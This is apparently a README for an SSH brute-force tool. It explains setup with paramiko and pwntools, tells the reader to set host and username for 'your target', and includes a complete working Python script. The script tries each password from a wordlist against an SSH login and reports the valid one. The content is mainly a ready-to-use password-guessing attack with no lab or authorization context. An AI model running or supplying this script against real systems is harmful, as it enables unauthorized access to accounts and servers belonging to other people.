# SSH Brute Force Script
This Python script is designed to perform a brute-force attack on an SSH server by trying multiple passwords from a Wordlist file. It uses the paramiko library to handle SSH connections and the pwn library for various utilities.

## Features
- SSH Connection Attempts: The script attempts to connect to an SSH server using different passwords from a provided word list.
- Exception Handling: Handles authentication exceptions gracefully, ensuring the script runs even if a password attempt fails.
- Efficiency: Stops the brute force attempt as soon as a valid password is found.
## Usage
### Prerequisites:

- Install the required libraries:
```
pip install paramiko pwntools
```
- Prepare the Wordlist:

Create a file named ssh-wordlist.txt containing the passwords to be tested, each on a new line.

- Run the Script:

Update the host and username variables in the script as per your target.
- Execute the script:
  
```
from pwn import *
import paramiko

host = '127.0.0.1'    # Target SSH server IP address
username = 'notroot'  # SSH username
attempts = 0          # Counter for the number of attempts

with open('ssh-wordlist.txt', 'r') as passs:
    for password in passs:
        password = password.strip('\n')
        try:
            print("[{}] attempting password: '{}'!".format(attempts, password))
            response = ssh(host=host, user=username, password=password, timeout=1)
            if response.connected():
                print("[>] valid password found: '{}'!".format(password))
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print('[x] invalid password')
        attempts += 1
```
